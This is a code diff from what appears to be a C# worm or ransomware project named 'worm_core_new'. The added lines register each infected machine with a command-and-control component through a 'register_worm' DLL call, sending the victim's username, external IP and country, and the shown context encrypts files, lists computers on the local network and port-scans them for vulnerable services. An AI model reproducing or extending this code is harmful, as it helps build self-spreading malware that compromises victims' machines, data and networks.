@@ -16,6 +16,10 @@ namespace worm_core_new
 {
     class Program
     {
+        // Use DllImport to import the Win32 MessageBox function.
+        [DllImport(@"C:\git\_personal\worm-core-new\worm-core-new\worm-core.dll", CharSet = CharSet.Unicode)]
+        static extern int register_worm(char XOR_key, [MarshalAs(UnmanagedType.LPStr)]string virus_id, [MarshalAs(UnmanagedType.LPStr)]string hostname, [MarshalAs(UnmanagedType.LPStr)]string ip, [MarshalAs(UnmanagedType.LPStr)]string country);
+
         [DllImport("user32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);
@@ -37,7 +41,7 @@ namespace worm_core_new
 
             //HTTP GET request for IP Address 
             WebClient client = new WebClient();
-            string ipString = client.DownloadString("http://bot.whatismyipaddress.com/");
+            string ipString = client.DownloadString("http://ipv4bot.whatismyipaddress.com/");
             Console.WriteLine("External IP address: {0}", ipString);
 
             //Location from keyboard layout or IP Address for another GET
@@ -55,11 +59,12 @@ namespace worm_core_new
             Decrypt("C:/Users/Matthew/Desktop/matthew-encrypted.txt", "C:/Users/Matthew/Desktop/matthew-decrypted.txt");
 
             // Call kade's function or work with kade to send everything to server
+            int yes = register_worm('A', "12345", Environment.UserName, ipString, json["countryCode"].ToString());
 
-
-            // MICAELA HERE - OPEN SOCKET TO SERVER - connect to c2
-            
-
+            if (yes == 0)
+            {
+                Console.WriteLine("NOOOOOOOOOOOOOOOOOOOOOOOOOO");
+            }
 
             // List all computers on local network
             DirectoryEntry root = new DirectoryEntry("WinNT:");
@@ -83,7 +88,7 @@ namespace worm_core_new
                 }
             }
 
-            Console.WriteLine("\n Port Scanning computers for vunerabilities");
+            Console.WriteLine("\nPort Scanning computers for vunerabilities");
             foreach (KeyValuePair<string, IPAddress> IP in toScan)
             {
                 Console.WriteLine("Scanning " + IP.Key + " at " + IP.Value);
@@ -103,10 +108,8 @@ namespace worm_core_new
                     }
                 }
             }
-
-
-
         }
+
         private static int[] Ports = new int[]
         {
             22,
@@ -115,7 +118,6 @@ namespace worm_core_new
             139,
             8080,
         };
-
 
         // function
         static void Encrypt(string source, string destination)
